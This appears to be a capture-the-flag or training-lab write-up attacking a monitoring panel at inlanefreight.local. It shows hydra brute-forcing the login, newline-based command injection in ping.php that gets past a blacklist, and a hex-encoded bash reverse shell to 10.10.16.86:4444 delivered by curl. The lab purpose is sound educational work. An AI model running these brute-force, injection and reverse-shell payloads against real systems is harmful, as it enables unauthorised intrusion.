

access the site redirect us to login page http://monitoring.inlanefreight.local/login.php
by  make bruforicng  on the logn page 
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid Credentials" -v -f 
<SNIP>
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
<SNIP>
```
we get username : admin and    password: 12qwaszx

#### waek passsowrd auth 
in` inlanefreight.local/monitoring/login.php`
we brut forcing 
```bash
╰─$ hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt inlanefreight.local  http-post-form "/monitoring/login.php:username=^USER^&password=^PASS^:F=Invalid" -v 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-05 20:25:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1683 login tries (l:17/p:99), ~106 tries per task
[DATA] attacking http-post-form://inlanefreight.local:80/monitoring/login.php:username=^USER^&password=^PASS^:F=Invalid
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 143.00 tries/min, 143 tries in 00:01h, 1540 to do in 00:11h, 16 active
[VERBOSE] Page redirected to http[s]://inlanefreight.local:80/monitoring/index.php
[80][http-post-form] host: inlanefreight.local   login: admin   password: 12qwaszx
[STATUS] 131.33 tries/min, 394 tries in 00:03h, 1289 to do in 00:10h, 16 active
[ERROR] Can not create restore file (./hydra.restore) - Permission denied
[STATUS] 134.14 tries/min, 939 tries in 00:07h, 744 to do in 00:06h, 16 active
```
 login: admin   password: 12qwaszx
#### COMMAND injection
we login to http://inlanefreight.local/monitoring and fin a command panel ,
![[Pasted image 20260206214454.png]]

we see that we are only lilmeted to excute some commands ex; date..cat..rm..
```BASH
INLANEFREIGHT ADMIN
admin@inlanefreight:~$ help
ls -
cat -
whoami -
date -
help -
clear -
reboot -
cd -
mv -
rm -
rmdir -
touch -
	connection_test -
```
we try to excute  `connection_test` and get secuuess 
```bash
admin@inlanefreight:~$ .
Success
```
now we  reqept the same comand and  interspet this reqest with burb suit  we get this req :
```bash
GET /monitoring/ping.php?ip=127.0.0.1 HTTP/1.1
Host: inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: keep-alive
Referer: http://inlanefreight.local/monitoring/index.php
Cookie: PHPSESSID=bsghe0tpnptbo1j7rj36gqumcs
Priority: u=0
```
we try to inject comand in the reqest url ip arg
```bash
curl 'http://inlanefreight.local/monitoring/ping.php?ip=127.0.0.1;ls'          
Invalid input
```
it seem that  we have a   blacklist filtring the inut commnads ew will try to bypass this by adding **newline character (`%0a`)** 
```bash
curl 'http://inlanefreight.local/monitoring/ping.php?ip=127.0.0.1%0als'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.055 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.055/0.055/0.055/0.000 ms
00112233_flag.txt
css
img
index.php
js
login.php
ping.php
```
ok it work we get comand injectiojn in our hand !!!
now let excute revser shell , 
for bypass the blacklist filtering we will use this caracters 
-    the tabe caracter `%09` for the sapce
-    the   Use Hex Encoding for the revsershell 
  ```bash
  echo -n "bash -i >& /dev/tcp/10.10.16.86/4444 0>&1" | xxd -p
62617368202d69203e26202f6465762f7463702f31302e31302e31362e38
362f3434343420303e2631
  ```
now we will embad this payload to the command in the format:  `127.0.0.1%0abash<<<$(xxd${IFS}-r${IFS}-p<<<HEXDECIMAL_HERE`
now we statrt new  netcat lisner 
```bash
nc -lnvp 4444
```

then pass our  ur final reverse shell commnd   :
```bash
curl 'http://inlanefreight.local/monitoring/ping.php?ip=127.0.0.1%0abash<<<$(xxd%09-r%09-p<<<62617368202d69203e26202f6465762f7463702f31302e31302e31362e38362f3434343420303e2631)'      
```
we get  bacl to our lisner and find that we get a spwn our shll 
![[Pasted image 20260206221453.png]]

